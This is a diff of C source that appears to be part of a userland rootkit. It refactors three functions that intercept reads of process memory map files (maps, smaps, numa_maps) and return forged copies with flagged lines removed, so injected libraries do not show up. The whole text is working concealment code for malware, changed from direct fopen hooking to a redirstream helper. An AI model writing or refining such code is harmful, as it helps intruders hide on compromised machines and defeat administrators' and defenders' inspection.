@@ -8,65 +8,62 @@ char *badstring(char *buf){
 }
 
 FILE *forge_maps(const char *pathname){
-    FILE *o = tmpfile(), *pnt;
+    FILE *tmp, *fp;
     char buf[LINE_MAX];
 
-    hook(CFOPEN);
-    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
+    fp = redirstream(pathname, &tmp);
+    if(fp == NULL){
         errno = ENOENT;
-	fclose(o);
         return NULL;
     }
 
-    while(fgets(buf, sizeof(buf), pnt) != NULL)
+    while(fgets(buf, sizeof(buf), fp) != NULL)
         if(!badstring(buf))
-            fputs(buf, o);
+            fputs(buf, tmp);
 
-    fclose(pnt);
-    fseek(o, 0, SEEK_SET);
-    return o;
+    fclose(fp);
+    fseek(tmp, 0, SEEK_SET);
+    return tmp;
 }
 
 FILE *forge_smaps(const char *pathname){
-    FILE *o = tmpfile(), *pnt;
+    FILE *tmp, *fp;
     char buf[LINE_MAX];
     int i = 0;
 
-    hook(CFOPEN);
-    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
+    fp = redirstream(pathname, &tmp);
+    if(fp == NULL){
         errno = ENOENT;
-	fclose(o);
         return NULL;
     }
 
-    while(fgets(buf, sizeof(buf), pnt) != NULL){
+    while(fgets(buf, sizeof(buf), fp) != NULL){
         if(i > 0) i++;
         if(i > 15) i = 0;
         if(badstring(buf)) i = 1;
-        if(i == 0) fputs(buf, o);
+        if(i == 0) fputs(buf, tmp);
     }
 
-    fclose(pnt);
-    fseek(o, 0, SEEK_SET);
-    return o;
+    fclose(fp);
+    fseek(tmp, 0, SEEK_SET);
+    return tmp;
 }
 
 FILE *forge_numamaps(const char *pathname){
-    FILE *o = tmpfile(), *pnt;
+    FILE *tmp, *fp;
     char buf[LINE_MAX];
 
-    hook(CFOPEN);
-    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
+    fp = redirstream(pathname, &tmp);
+    if(fp == NULL){
         errno = ENOENT;
-	fclose(o);
         return NULL;
     }
 
-    while(fgets(buf, sizeof(buf), pnt) != NULL)
+    while(fgets(buf, sizeof(buf), fp) != NULL)
         if(!badstring(buf))
-            fputs(buf, o);
+            fputs(buf, tmp);
 
-    fclose(pnt);
-    fseek(o, 0, SEEK_SET);
-    return o;
+    fclose(fp);
+    fseek(tmp, 0, SEEK_SET);
+    return tmp;
 }
